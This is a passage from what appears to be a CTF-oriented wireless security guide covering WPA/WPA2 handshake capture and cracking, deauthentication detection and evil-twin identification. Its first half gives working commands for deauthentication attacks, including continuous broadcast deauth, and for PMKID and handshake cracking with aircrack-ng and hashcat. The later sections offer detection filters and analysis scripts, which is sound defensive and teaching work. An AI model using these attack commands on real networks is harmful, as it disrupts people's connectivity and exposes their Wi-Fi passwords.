**Bluetooth/BLE Analysis:** btmon, hcitool, gatttool, BLE advertisement sniffing, proximity tracking

**SDR Wireless Analysis:** GNU Radio, HackRF, spectrum analysis, non-WiFi protocol analysis (ZigBee, Z-Wave, LoRa)

---

## WPA Handshake Capture

WPA/WPA2 handshake capture is fundamental for wireless network security analysis and password cracking in CTF scenarios. The 4-way handshake authenticates clients to access points and derives encryption keys.

### WPA/WPA2 4-Way Handshake Overview

**Handshake Process:**

1. **Message 1 (AP → Client)**: AP sends ANonce (random number)
2. **Message 2 (Client → AP)**: Client sends SNonce + MIC (Message Integrity Check)
3. **Message 3 (AP → Client)**: AP sends GTK (Group Temporal Key) + MIC
4. **Message 4 (Client → AP)**: Client acknowledges GTK reception

**Required Components for Cracking:**

- All 4 EAPOL (Extensible Authentication Protocol over LAN) messages, OR
- Messages 1, 2, and 3 (sufficient for hashcat)
- ESSID (network name)
- Client MAC address
- AP MAC address

### Wireless Interface Setup

**Check Wireless Interfaces:**

```bash
# List wireless interfaces
iwconfig

# Or use iw
iw dev

# Check interface details
ip link show

# Common wireless interface names: wlan0, wlan1, wlp3s0
```

**Enable Monitor Mode:**

```bash
# Stop conflicting processes
sudo airmon-ng check kill

# Enable monitor mode (creates mon interface)
sudo airmon-ng start wlan0

# Verify monitor mode enabled
iwconfig
# Should show wlan0mon in Mode:Monitor

# Alternative method without airmon-ng
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
```

**Set Specific Channel:**

```bash
# Set to channel 6
sudo iwconfig wlan0mon channel 6

# Or use iw
sudo iw dev wlan0mon set channel 6

# Set channel width (for 5GHz)
sudo iw dev wlan0mon set channel 36 HT40+
```

**Disable Monitor Mode:**

```bash
# Stop monitor mode
sudo airmon-ng stop wlan0mon

# Re-enable managed mode
sudo systemctl start NetworkManager
```

### Scanning for Networks

**Using airodump-ng:**

```bash
# Scan all channels and bands
sudo airodump-ng wlan0mon

# Scan specific channel
sudo airodump-ng -c 6 wlan0mon

# Scan specific band (2.4GHz: a,b,g / 5GHz: a)
sudo airodump-ng --band abg wlan0mon

# Scan with output file
sudo airodump-ng -w scan_output wlan0mon

# Show only WPA/WPA2 networks
sudo airodump-ng --encrypt wpa wlan0mon
```

**Airodump-ng Output Columns:**

```
BSSID             - AP MAC address
PWR               - Signal strength (-30 is stronger than -70)
Beacons           - Number of beacon frames
#Data             - Number of data packets
#/s               - Data packets per second
CH                - Channel number
MB                - Maximum speed supported
ENC               - Encryption (WEP, WPA, WPA2, WPA3)
CIPHER            - Cipher suite (CCMP, TKIP)
AUTH              - Authentication (PSK, MGT)
ESSID             - Network name
```

**Using wash for WPS:**

```bash
# Scan for WPS-enabled networks
sudo wash -i wlan0mon

# Scan specific channel
sudo wash -i wlan0mon -c 6

# Show all networks including those with WPS locked
sudo wash -i wlan0mon -s
```

### Capturing WPA Handshake

**Method 1: Passive Capture (Wait for Client Connection)**

```bash
# Target specific AP and channel, write to file
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Output files created:
# capture-01.cap (packet capture)
# capture-01.csv (network data)
# capture-01.kismet.csv (kismet format)
# capture-01.kismet.netxml (kismet XML)
```

**Wait for "WPA handshake" message in top-right corner:**

```
CH  6 ][ Elapsed: 2 mins ][ 2024-10-19 10:30 ][ WPA handshake: AA:BB:CC:DD:EE:FF
```

**Method 2: Active Capture (Deauthentication Attack)**

Deauthentication forces client reconnection, triggering handshake capture.

```bash
# Terminal 1: Start capture
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon

# Terminal 2: Deauthenticate specific client
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
# --deauth 10: Send 10 deauth packets
# -a: Target AP MAC (BSSID)
# -c: Target client MAC (STATION)

# Or deauthenticate all clients on AP
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Continuous deauth (until Ctrl+C)
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon
```

**Deauth Parameters:**

```bash
# Broadcast deauth (affects all clients)
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Targeted deauth (specific client)
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon

# Reason code (optional, default is 7)
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF --reason 3 wlan0mon
# Reason codes:
# 1: Unspecified
# 2: Previous authentication no longer valid
# 3: Deauthenticated because sending STA is leaving
# 7: Class 3 frame received from nonassociated STA
```

### Verifying Handshake Capture

**Using aircrack-ng:**

```bash
# Check for handshake
sudo aircrack-ng handshake-01.cap

# Look for output:
# [00:00:00] 1 potential targets
# 1  AA:BB:CC:DD:EE:FF  WPA (1 handshake)
```

**Using pyrit:**

```bash
# Install pyrit
sudo apt install pyrit

# Analyze capture
pyrit -r handshake-01.cap analyze

# Output shows:
# #1: AccessPoint AA:BB:CC:DD:EE:FF ('TargetNetwork'):
#   #1: Station 11:22:33:44:55:66, 1 handshake(s):
#     #1: HMAC_SHA1_AES, good, spread 1
```

**Using tshark:**

```bash
# Filter for EAPOL frames
tshark -r handshake-01.cap -Y "eapol"

# Check for all 4 messages
tshark -r handshake-01.cap -Y "eapol" -T fields -e frame.number -e wlan.sa -e wlan.da -e eapol.keydes.key_info

# Look for key_info values:
# 0x008a or 0x010a: Message 1 (AP → Client)
# 0x010a or 0x0109: Message 2 (Client → AP)
# 0x13ca or 0x13c9: Message 3 (AP → Client)
# 0x030a or 0x0309: Message 4 (Client → AP)
```

**Using Wireshark:**

```bash
# Open capture
wireshark handshake-01.cap

# Filter for EAPOL frames
eapol

# Verify handshake presence:
# Message 1: EAPOL frame with Key Information field = 0x008a
# Message 2: EAPOL frame with Key Information field = 0x010a
# Message 3: EAPOL frame with Key Information field = 0x13ca
# Message 4: EAPOL frame with Key Information field = 0x030a
```

### Wireshark Wireless Display Filters

**Basic Wireless Filters:**

```bash
# All 802.11 frames
wlan

# Management frames
wlan.fc.type == 0

# Control frames
wlan.fc.type == 1

# Data frames
wlan.fc.type == 2

# Specific frame subtypes
wlan.fc.type_subtype == 0  # Association Request
wlan.fc.type_subtype == 1  # Association Response
wlan.fc.type_subtype == 4  # Probe Request
wlan.fc.type_subtype == 5  # Probe Response
wlan.fc.type_subtype == 8  # Beacon
wlan.fc.type_subtype == 11 # Authentication
wlan.fc.type_subtype == 12 # Deauthentication
wlan.fc.type_subtype == 13 # Action
```

**EAPOL/Handshake Filters:**

```bash
# All EAPOL frames
eapol

# WPA handshake messages
eapol.type == 3  # Key frames

# Specific handshake messages by Key Info
wlan.rsn.key.info == 0x008a  # Message 1
wlan.rsn.key.info == 0x010a  # Message 2
wlan.rsn.key.info == 0x13ca  # Message 3
wlan.rsn.key.info == 0x030a  # Message 4

# EAPOL with MIC
eapol && wlan.rsn.key.mic

# Filter by BSSID
wlan.bssid == aa:bb:cc:dd:ee:ff

# Filter by specific client
wlan.addr == 11:22:33:44:55:66
```

**Beacon Frame Analysis:**

```bash
# All beacons
wlan.fc.type_subtype == 8

# Beacons from specific BSSID
wlan.fc.type_subtype == 8 && wlan.bssid == aa:bb:cc:dd:ee:ff

# Extract ESSID from beacons
wlan.ssid

# Hidden SSIDs (length 0)
wlan.ssid == "" && wlan.fc.type_subtype == 8

# Beacon interval
wlan.fixed.beacon

# Channel from DS Parameter Set
wlan_radio.channel
```

**Probe Request/Response Analysis:**

```bash
# Probe requests
wlan.fc.type_subtype == 4

# Probe responses
wlan.fc.type_subtype == 5

# Directed probe requests (specific SSID)
wlan.fc.type_subtype == 4 && wlan.ssid != ""

# Broadcast probe requests (looking for any network)
wlan.fc.type_subtype == 4 && wlan.ssid == ""

# Probe requests from specific client
wlan.fc.type_subtype == 4 && wlan.sa == 11:22:33:44:55:66
```

### Extracting Handshakes with tshark

```bash
# Extract only EAPOL frames to new pcap
tshark -r full_capture.cap -Y "eapol" -w handshake_only.cap

# Extract handshake for specific BSSID
tshark -r full_capture.cap -Y "eapol && wlan.bssid == aa:bb:cc:dd:ee:ff" -w target_handshake.cap

# Display EAPOL key information
tshark -r handshake.cap -Y "eapol" -T fields \
  -e frame.time \
  -e wlan.sa \
  -e wlan.da \
  -e eapol.keydes.key_info \
  -e eapol.keydes.nonce

# Count EAPOL frames per BSSID
tshark -r capture.cap -Y "eapol" -T fields -e wlan.bssid | sort | uniq -c
```

### Converting Captures for Hashcat

**Using aircrack-ng suite:**

```bash
# Convert to hccapx format (hashcat 3.6+, deprecated in 6.0+)
sudo apt install hcxtools

# Convert cap to hccapx (legacy)
cap2hccapx handshake.cap output.hccapx

# Convert cap to hashcat 22000 format (hashcat 6.0+)
hcxpcapngtool -o output.22000 handshake.cap

# Or use hcxpcaptool for older versions
hcxpcaptool -z output.16800 handshake.cap
```

**Using wlanhcx2ssid:**

```bash
# Extract ESSID and handshake info
wlanhcx2ssid output.22000
```

**Manual Extraction with hcxdumptool:**

```bash
# Capture directly in hashcat format
hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=15

# Convert pcapng to hash
hcxpcapngtool -o output.22000 capture.pcapng
```

### Cracking WPA/WPA2 Handshakes

**Using aircrack-ng:**

```bash
# Dictionary attack
aircrack-ng -w wordlist.txt handshake-01.cap

# Specify target BSSID
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF handshake-01.cap

# Specify ESSID
aircrack-ng -w wordlist.txt -e "TargetNetwork" handshake-01.cap

# Multiple wordlists
aircrack-ng -w wordlist1.txt,wordlist2.txt handshake-01.cap
```

**Using hashcat:**

```bash
# WPA/WPA2 (hashcat mode 22000 for PMKID or handshake)
hashcat -m 22000 output.22000 wordlist.txt

# With rules
hashcat -m 22000 output.22000 wordlist.txt -r rules/best64.rule

# Brute force (8 digits)
hashcat -m 22000 output.22000 -a 3 ?d?d?d?d?d?d?d?d

# Mask attack (common patterns)
hashcat -m 22000 output.22000 -a 3 ?u?l?l?l?l?l?d?d

# Show cracked passwords
hashcat -m 22000 output.22000 --show

# Legacy formats:
# WPA/WPA2 (mode 2500, .hccapx format, deprecated)
hashcat -m 2500 output.hccapx wordlist.txt

# WPA/WPA2 (mode 16800, .16800 format)
hashcat -m 16800 output.16800 wordlist.txt
```

**Using pyrit:**

```bash
# Import ESSID
pyrit -e "TargetNetwork" create_essid

# Import passwords
pyrit -i wordlist.txt import_passwords

# Batch process
pyrit batch

# Attack handshake
pyrit -r handshake-01.cap attack_db

# Or direct attack
pyrit -r handshake-01.cap -i wordlist.txt attack_passthrough
```

### PMKID Attack (WPA/WPA2 without Handshake)

PMKID is derived from PMK (Pairwise Master Key) and can be cracked without capturing full handshake.

**Capturing PMKID:**

```bash
# Using hcxdumptool (captures PMKID directly)
sudo hcxdumptool -i wlan0mon -o pmkid_capture.pcapng --enable_status=15

# Filter for PMKID
hcxpcapngtool -o pmkid.22000 pmkid_capture.pcapng
```

**Cracking PMKID:**

```bash
# Same method as handshake (hashcat mode 22000)
hashcat -m 22000 pmkid.22000 wordlist.txt

# PMKID is faster to crack than full handshake
# because only one hash per AP instead of per handshake
```

### WPA3 Considerations

[Unverified: WPA3 implementation and attack surface varies by device]

WPA3 uses SAE (Simultaneous Authentication of Equals) instead of PSK.

**Key Differences:**

- No 4-way handshake in traditional sense
- Dragonfly handshake (SAE)
- Protected Management Frames (PMF) mandatory
- Forward secrecy

**Capture Considerations:**

```bash
# WPA3 traffic appears as:
wlan.rsn.akm.type == 8  # SAE

# Dragonfly downgrade attacks may force WPA2
# But this requires active MITM, not passive capture
```

### Analyzing Captured Handshakes in Wireshark

**Step-by-Step Analysis:**

**1. Open Capture and Filter EAPOL:**

```bash
wireshark handshake.cap
# Filter: eapol
```

**2. Identify Handshake Participants:**

```bash
# Check frame details:
# - Source Address (wlan.sa): Client MAC
# - Destination Address (wlan.da): AP MAC
# - BSSID (wlan.bssid): AP MAC
```

**3. Verify Message Sequence:**

Expand "IEEE 802.11 QoS Data" → "802.1X Authentication" → "Key Descriptor"

**Message 1 (AP → Client):**

- Key Information: 0x008a or 0x010a
- Key Nonce (ANonce) present
- Key MIC: Not set
- Key Data Length: 0 or contains PMKID

**Message 2 (Client → AP):**

- Key Information: 0x010a or 0x0109
- Key Nonce (SNonce) present
- Key MIC: Set (calculated by client)
- Key Data Length: Variable (contains RSN IE)

**Message 3 (AP → Client):**

- Key Information: 0x13ca or 0x13c9
- Key Nonce (ANonce) present
- Key MIC: Set
- Key Data Length: Contains GTK

**Message 4 (Client → AP):**

- Key Information: 0x030a or 0x0309
- Key Nonce: Empty
- Key MIC: Set
- Key Data Length: 0

**4. Extract Key Data:**

```bash
# Right-click packet → Follow → UDP Stream
# Or export specific values:

# ANonce (from Message 1)
wlan.rsn.key.nonce

# SNonce (from Message 2)
wlan.rsn.key.nonce

# MIC (from Messages 2, 3, 4)
wlan.rsn.key.mic

# Key Data
wlan.rsn.key.data
```

### Troubleshooting Handshake Capture

**Problem: No Handshake Captured**

```bash
# Check if clients are connected
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon
# Look for "STATION" column with client MACs

# Ensure correct channel
# AP may have changed channels

# Increase deauth packet count
sudo aireplay-ng --deauth 20 -a AA:BB:CC:DD:EE:FF wlan0mon

# Try targeting specific active client
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
```

**Problem: Incomplete Handshake**

```bash
# Verify all 4 messages present
tshark -r handshake.cap -Y "eapol" -T fields -e frame.number -e eapol.keydes.key_info

# Sometimes only 3 messages needed (1, 2, 3)
# Message 4 is ACK and may not be required for cracking

# Re-capture if only Message 1 or 2 present
```

**Problem: Channel Hopping Interference**

```bash
# Lock to specific channel before capture
sudo iwconfig wlan0mon channel 6

# Verify channel locked
iwconfig wlan0mon
# Should show "Frequency:2.437 GHz"

# Don't let airodump-ng scan all channels
# Always use -c flag
```

**Problem: Weak Signal**

```bash
# Move closer to AP
# Use external antenna
# Check current signal strength in airodump-ng PWR column
# Values closer to -30 dBm are better than -70 dBm
```

## Deauthentication Detection

Deauthentication attacks disconnect clients from wireless networks. Detection is crucial for identifying malicious activity, Evil Twin attacks, and network disruptions.

### Deauthentication Frame Structure

**802.11 Deauth Frame:**

- Type: Management (0)
- Subtype: Deauthentication (12)
- Reason Code: Indicates why deauth was sent

**Common Reason Codes:**

```
Code 1: Unspecified reason
Code 2: Previous authentication no longer valid
Code 3: Deauthenticated because sending STA is leaving (IBSS or BSS)
Code 4: Disassociated due to inactivity
Code 5: Disassociated because AP is unable to handle all currently associated STAs
Code 6: Class 2 frame received from nonauthenticated STA
Code 7: Class 3 frame received from nonassociated STA
Code 8: Disassociated because sending STA is leaving (or has left) BSS
```

### Detecting Deauth Attacks in Wireshark

**Basic Deauth Filter:**

```bash
# All deauthentication frames
wlan.fc.type_subtype == 12

# Or using frame type
wlan.fc.type == 0 && wlan.fc.subtype == 12
```

**Deauth by Reason Code:**

```bash
# Reason code 7 (common in attacks)
wlan.fc.type_subtype == 12 && wlan.fixed.reason_code == 7

# Reason code 3 (STA leaving)
wlan.fc.type_subtype == 12 && wlan.fixed.reason_code == 3

# Unspecified reason (suspicious)
wlan.fc.type_subtype == 12 && wlan.fixed.reason_code == 1
```

**Deauth by Direction:**

```bash
# Deauths from specific AP
wlan.fc.type_subtype == 12 && wlan.sa == aa:bb:cc:dd:ee:ff

# Deauths to specific client
wlan.fc.type_subtype == 12 && wlan.da == 11:22:33:44:55:66

# Broadcast deauths (all clients)
wlan.fc.type_subtype == 12 && wlan.da == ff:ff:ff:ff:ff:ff
```

**High Volume Deauth Detection:**

```bash
# Find APs sending many deauths
tshark -r capture.cap -Y "wlan.fc.type_subtype == 12" -T fields -e wlan.sa | \
sort | uniq -c | sort -rn

# Output shows deauth count per source MAC:
#  150 aa:bb:cc:dd:ee:ff
#   89 11:22:33:44:55:66
#    5 99:88:77:66:55:44

# High counts indicate potential attack
```

### Analyzing Deauth Patterns

**Temporal Analysis:**

```bash
# Extract deauth timestamps
tshark -r capture.cap -Y "wlan.fc.type_subtype == 12" -T fields \
  -e frame.time_relative -e wlan.sa -e wlan.da -e wlan.fixed.reason_code

# Look for patterns:
# - Regular intervals (automated attack)
# - Burst attacks (multiple deauths in short time)
# - Continuous deauth (persistent attack)
```

**Python Script for Deauth Analysis:**

```python
#!/usr/bin/env python3
# deauth_analyzer.py

from scapy.all import *
from collections import defaultdict, Counter
import sys

def analyze_deauth(pcap_file):
    """Analyze deauthentication patterns in capture"""
    
    packets = rdpcap(pcap_file)
    
    deauth_sources = defaultdict(list)
    deauth_targets = defaultdict(list)
    reason_codes = Counter()
    timestamps = []
    
    for pkt in packets:
        if pkt.haslayer(Dot11Deauth):
            src = pkt.addr2  # Source (who sent deauth)
            dst = pkt.addr1  # Destination (who receives deauth)
            reason = pkt[Dot11Deauth].reason
            time = float(pkt.time)
            
            deauth_sources[src].append((time, dst, reason))
            deauth_targets[dst].append((time, src, reason))
            reason_codes[reason] += 1
            timestamps.append(time)
    
    print("[*] Deauthentication Attack Analysis")
    print("=" * 60)
    print(f"\nTotal deauth frames: {len(timestamps)}")
    print(f"Unique sources: {len(deauth_sources)}")
    print(f"Unique targets: {len(deauth_targets)}")
    
    print("\n[*] Top Deauth Sources:")
    for src, events in sorted(deauth_sources.items(), 
                               key=lambda x: len(x[1]), 
                               reverse=True)[:5]:
        print(f"  {src}: {len(events)} deauths")
        
        # Check if broadcast deauth
        broadcast_count = sum(1 for _, dst, _ in events if dst == "ff:ff:ff:ff:ff:ff")
        if broadcast_count > 0:
            print(f"    -> {broadcast_count} broadcast deauths (SUSPICIOUS)")
    
    print("\n[*] Top Deauth Targets:")
    for dst, events in sorted(deauth_targets.items(), 
                               key=lambda x: len(x[1]), 
                               reverse=True)[:5]:
        if dst == "ff:ff:ff:ff:ff:ff":
            print(f"  Broadcast: {len(events)} deauths (affects all clients)")
        else:
            print(f"  {dst}: {len(events)} deauths")
    
    print("\n[*] Reason Code Distribution:")
    for reason, count in reason_codes.most_common():
        print(f"  Code {reason}: {count} occurrences")
    
    # Temporal analysis
    if len(timestamps) > 1:
        timestamps.sort()
        intervals = [timestamps[i+1] - timestamps[i] 
                    for i in range(len(timestamps)-1)]
        avg_interval = sum(intervals) / len(intervals)
        
        print(f"\n[*] Temporal Analysis:")
        print(f"  First deauth: {timestamps[0]:.2f}s")
        print(f"  Last deauth: {timestamps[-1]:.2f}s")
        print(f"  Duration: {timestamps[-1] - timestamps[0]:.2f}s")
        print(f"  Average interval: {avg_interval:.3f}s")
        
        # Detect burst attacks
        burst_threshold = 0.1  # 100ms
        burst_count = sum(1 for interval in intervals if interval < burst_threshold)
        if burst_count > len(intervals) * 0.5:
            print(f"  [!] BURST ATTACK DETECTED: {burst_count}/{len(intervals)} rapid deauths")
    
    # Attack indicators
    print("\n[*] Attack Indicators:")
    indicators = []
    
    if len(timestamps) > 50:
        indicators.append("HIGH VOLUME: >50 deauth frames")
    
    for src, events in deauth_sources.items():
        broadcast = sum(1 for _, dst, _ in events if dst == "ff:ff:ff:ff:ff:ff")
        if broadcast > 10:
            indicators.append(f"BROADCAST DEAUTH: {src} sent {broadcast} broadcast deauths")
    
    if reason_codes[7] > len(timestamps) * 0.5:
        indicators.append("SUSPICIOUS REASON CODE: Majority use code 7")
    
    if indicators:
        for indicator in indicators:
            print(f"  [!] {indicator}")
    else:
        print("  [+] No obvious attack indicators")

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <pcap_file>")
        sys.exit(1)
    
    analyze_deauth(sys.argv[1])
```

**Usage:**

```bash
chmod +x deauth_analyzer.py
./deauth_analyzer.py wireless_capture.cap
```

### Disassociation vs. Deauthentication

**Disassociation Frame:**

```bash
# Disassociation frames (similar to deauth but different layer)
wlan.fc.type_subtype == 10

# Disassociation is more polite than deauthentication
# Deauth happens at authentication layer
# Disassoc happens at association layer
```

**Combined Detection:**

```bash
# Both deauth and disassoc frames
wlan.fc.type_subtype == 10 || wlan.fc.type_subtype == 12

# Count both
tshark -r capture.cap -Y "wlan.fc.type_subtype == 10 || wlan.fc.type_subtype == 12" | wc -l
```

### Legitimate vs. Malicious Deauth

**Legitimate Reasons:**

- Client roaming to better AP
- AP shutting down
- Client intentionally disconnecting
- Network congestion/overload
- Weak signal causing reconnection

**Malicious Indicators:**

- High volume (>20-50 in short time)
- Broadcast destination (ff:ff:ff:ff:ff:ff)
- Regular intervals (automated tool)
- Unusual reason codes
- Source MAC doesn't match legitimate AP
- Simultaneous with rogue AP beacons

### Real-Time Deauth Detection

**Using airodump-ng:**

```bash
# Monitor network and watch for deauth
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon

# Deauths appear at bottom of screen:
# HH:MM:SS Deauthentication from AA:BB:CC:DD:EE:FF
```

**Using tshark for Live Monitoring:**

```bash
# Live capture with deauth alerts
sudo tshark -i wlan0mon -Y "wlan.fc.type_subtype == 12" -T fields \
  -e frame.time -e wlan.sa -e wlan.da -e wlan.fixed.reason_code

# With alert script
sudo tshark -i wlan0mon -Y "wlan.fc.type_subtype == 12" -T fields \
  -e wlan.sa | while read mac; do
    echo "[!] DEAUTH DETECTED from $mac at $(date)"
    # Could trigger alert, log, or automated response
done
```

**Using Kismet:**

```bash
# Kismet has built-in deauth detection
kismet -c wlan0mon

# Access web interface at http://localhost:2501
# Navigate to "Alerts" to see deauth notifications
```

### Capturing Deauth Attack Tools

[Unverified: Tool-specific signatures may vary by version]

**Aireplay-ng Signature:**

- Sends deauth frames rapidly
- Usually uses reason code 7
- Source MAC may match target AP or be spoofed

**MDK3/MDK4 Signature:**

- High packet rate (hundreds per second)
- Multiple attack modes detectable
- Often uses broadcast destination

**Detecting Attack Tools:**

```bash
# Look for unusual packet rates
tshark -r capture.cap -Y "wlan.fc.type_subtype == 12" -T fields -e frame.time_relative | \
awk '{print int($1)}' | uniq -c

# High counts per second indicate automated tool:
#  150 0   <- 150 deauths in first second
#  145 1
#  138 2
# This pattern suggests attack tool, not legitimate disconnect
```

### Protected Management Frames (PMF/802.11w)

PMF protects against deauthentication attacks by encrypting management frames.

**Detecting PMF:**

```bash
# Check for PMF capability in beacons/association
wlan.rsn.capabilities.mfpr == 1  # Management Frame Protection Required
wlan.rsn.capabilities.mfpc == 1  # Management Frame Protection Capable

# Protected deauth frames (encrypted)
wlan.fc.type_subtype == 12 && wlan.fc.protected == 1

# Unprotected deauth on PMF network (attack attempt)
wlan.rsn.capabilities.mfpr == 1 && wlan.fc.type_subtype == 12 && wlan.fc.protected == 0
```

**PMF Limitations:**

[Inference: Based on 802.11w specification] PMF is mandatory in WPA3 but optional in WPA2. Networks without PMF enabled remain vulnerable to deauthentication attacks.

### Deauth Detection Script for CTF

```bash
#!/bin/bash
# deauth_detector.sh - Quick deauth detection in CTF

PCAP=$1

if [ -z "$PCAP" ]; then
    echo "Usage: $0 <pcap_file>"
    exit 1
fi

echo "[*] Analyzing deauthentication frames in $PCAP"
echo

# Count total deauths
TOTAL=$(tshark -r "$PCAP" -Y "wlan.fc.type_subtype == 12" 2>/dev/null | wc -l)
echo "[*] Total deauth frames: $TOTAL"

if [ "$TOTAL" -eq 0 ]; then
    echo "[+] No deauthentication frames detected"
    exit 0
fi

# Find deauth sources
echo
echo "[*] Deauth sources:"
tshark -r "$PCAP" -Y "wlan.fc.type_subtype == 12" -T fields -e wlan.sa 2>/dev/null | \
sort | uniq -c | sort -rn | head -10

# Find deauth targets
echo
echo "[*] Deauth targets:"
tshark -r "$PCAP" -Y "wlan.fc.type_subtype == 12" -T fields -e wlan.da 2>/dev/null | \
sort | uniq -c | sort -rn | head -10

# Check for broadcast deauth
BROADCAST=$(tshark -r "$PCAP" -Y "wlan.fc.type_subtype == 12 && wlan.da == ff:ff:ff:ff:ff:ff" 2>/dev/null | wc -l)
if [ "$BROADCAST" -gt 0 ]; then
    echo
    echo "[!] WARNING: $BROADCAST broadcast deauthentication frames detected"
    echo "[!] This is highly suspicious and indicates an attack"
fi

# Reason code distribution
echo
echo "[*] Reason codes:"
tshark -r "$PCAP" -Y "wlan.fc.type_subtype == 12" -T fields -e wlan.fixed.reason_code 2>/dev/null | \
sort | uniq -c | sort -rn

# Timeline
echo
echo "[*] Deauth timeline (first 10):"
tshark -r "$PCAP" -Y "wlan.fc.type_subtype == 12" -T fields \
-e frame.time -e wlan.sa -e wlan.da 2>/dev/null | head -10

echo
echo "[*] Analysis complete"
```

## Evil Twin Identification

Evil Twin attacks involve creating a rogue access point that mimics a legitimate network to intercept traffic or steal credentials. Detection is critical for identifying man-in-the-middle attacks.

### Evil Twin Attack Characteristics

**What is an Evil Twin:**

- Rogue AP with same or similar SSID as legitimate network
- May have identical or spoofed BSSID
- Typically has stronger signal to attract clients
- May use deauthentication to force client reconnection
- Can operate on same or different channel

**Attack Objectives:**

- Credential harvesting (captive portal)
- Man-in-the-middle (MITM) traffic interception
- Malware distribution
- Session hijacking

### Detecting Evil Twins in Wireshark

**Same SSID, Different BSSID:**

```bash
# Find all BSSIDs for specific SSID
tshark -r capture.cap -Y "wlan.fc.type_subtype == 8" -T fields \
-e wlan.ssid -e wlan.bssid | grep "TargetNetwork" | sort -u

# Output showing multiple BSSIDs:
# TargetNetwork    aa:bb:cc:dd:ee:ff
# TargetNetwork    11:22:33:44:55:66  <- Potential Evil Twin

# Should only see one BSSID per SSID in legitimate network
```

**Same BSSID, Different Channels:**

```bash
# Check channel usage per BSSID
tshark -r capture.cap -Y "wlan.fc.type_subtype == 8" -T fields \
-e wlan.bssid -e wlan_radio.channel | sort -u

# Legitimate AP stays on one channel
# Evil Twin may appear on multiple channels
```

**Beacon Interval Analysis:**

```bash
# Extract beacon intervals
tshark -r capture.cap -Y "wlan.fc.type_subtype == 8 && wlan.bssid == aa:bb:cc:dd:ee:ff" \
-T fields -e wlan.fixed.beacon

# Legitimate APs have consistent beacon intervals (usually 100 TU = 102.4ms)
# Evil Twins may have different intervals
```

**Signal Strength Anomalies:**

```bash
# Compare signal strengths
wlan.fc.type_subtype == 8 && wlan.ssid == "TargetNetwork"

# In Wireshark, check:
# radiotap.dbm_antsignal or wlan_radio.signal_dbm

# Evil Twin often has unusually strong signal
# Especially if attacker is close to victim
```

### Identifying Rogue APs by MAC Address

**OUI (Organizationally Unique Identifier) Analysis:**

```bash
# Extract BSSIDs
tshark -r capture.cap -Y "wlan.fc.type_subtype == 8" -T fields -e wlan.bssid | sort -u

# Check OUI (first 3 bytes)
# Example: aa:bb:cc:dd:ee:ff
# OUI = aa:bb:cc

# Lookup OUI
curl "https://api.macvendors.com/aa:bb:cc"
# Or use local database
grep -i "aa:bb:cc" /usr/share/ieee-data/oui.txt

# Mismatched manufacturers for same SSID indicate Evil Twin
```

**Locally Administered MAC Addresses:**

```bash
# Locally administered MACs have bit 1 of first byte set
# Example: x2, x6, xA, xE in second hex digit

# Filter for locally administered addresses
# First byte's second least significant bit = 1
# Examples: 02:xx:xx, 06:xx:xx, 0A:xx:xx, 0E:xx:xx, etc.

# These are often used in spoofed/rogue APs
```

**Python OUI Checker:**

```python
#!/usr/bin/env python3
# oui_checker.py

from scapy.all import *
import sys
from collections import defaultdict

def check_oui(bssid):
    """Check if MAC is locally administered"""
    first_byte = int(bssid.split(':')[0], 16)
    return bool(first_byte & 0x02)  # Check bit 1

def analyze_aps(pcap_file):
    """Analyze APs for suspicious characteristics"""
    
    packets = rdpcap(pcap_file)
    
    aps = defaultdict(lambda: {
        'bssid': None,
        'channels': set(),
        'beacons': 0,
        'crypto': set(),
        'locally_admin': False
    })
    
    for pkt in packets:
        if pkt.haslayer(Dot11Beacon):
            ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
            bssid = pkt[Dot11].addr3
            
            # Get channel
            channel = None
            if pkt.haslayer(Dot11Elt):
                elt = pkt[Dot11Elt]
                while elt:
                    if elt.ID == 3:  # DS Parameter Set
                        channel = elt.info[0] if elt.info else None
                    elt = elt.payload.getlayer(Dot11Elt)
            
            aps[ssid]['bssid'] = bssid if aps[ssid]['bssid'] is None else aps[ssid]['bssid']
            if channel:
                aps[ssid]['channels'].add(channel)
            aps[ssid]['beacons'] += 1
            aps[ssid]['locally_admin'] = check_oui(bssid)
            
            # Check if multiple BSSIDs for same SSID
            if aps[ssid]['bssid'] != bssid:
                print(f"[!] EVIL TWIN DETECTED: {ssid}")
                print(f"    Legitimate BSSID: {aps[ssid]['bssid']}")
                print(f"    Rogue BSSID: {bssid}")
    
    print("\n[*] Network Summary:")
    for ssid, data in aps.items():
        if ssid:
            print(f"\nSSID: {ssid}")
            print(f"  BSSID: {data['bssid']}")
            print(f"  Channels: {sorted(data['channels'])}")
            print(f"  Beacons: {data['beacons']}")
            
            if data['locally_admin']:
                print(f"  [!] WARNING: Locally administered MAC (possibly spoofed)")
            
            if len(data['channels']) > 1:
                print(f"  [!] WARNING: Multiple channels detected (possible rogue AP)")

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <pcap_file>")
        sys.exit(1)
    
    analyze_aps(sys.argv[1])
```

### Encryption and Security Comparison

**Mismatched Security:**

```bash
# Extract security info per SSID/BSSID
tshark -r capture.cap -Y "wlan.fc.type_subtype == 8" -T fields \
-e wlan.ssid -e wlan.bssid -e wlan.rsn.akm.type

# Different encryption for same SSID indicates Evil Twin:
# TargetNetwork  aa:bb:cc:dd:ee:ff  2  (WPA2-PSK)
# TargetNetwork  11:22:33:44:55:66  0  (Open) <- Evil Twin
```

